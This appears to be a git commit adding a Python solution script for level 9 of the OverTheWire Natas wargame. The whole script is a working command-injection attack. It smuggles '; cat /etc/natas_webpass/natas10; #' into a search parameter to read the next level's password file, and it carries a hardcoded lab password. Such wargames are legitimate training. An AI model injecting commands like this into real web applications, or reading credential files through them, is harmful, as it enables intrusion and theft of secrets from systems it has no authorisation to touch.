cd915b136a32dcae65a4a29a659fe4da7bf7a16b
iicrazyjr <vegaarjonaraul@gmail.com>
2023-03-21 16:50:35 +0100

    Natas 10 script

---
+++ Natas/natas9.py
@@ -0,0 +1,17 @@
+import requests
+import re
+import binascii, base64
+import urllib.parse
+
+payload = """; cat /etc/natas_webpass/natas10; #"""
+
+url = "http://natas9.natas.labs.overthewire.org/?needle=%s&submit=Search" %(urllib.parse.quote_plus(payload))
+user = "natas9"
+password = "Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd"
+
+r = requests.get(url, auth=(user, password))
+
+result = re.findall(r"\b\w{32}\b", r.text)[1]
+
+print(result)
+
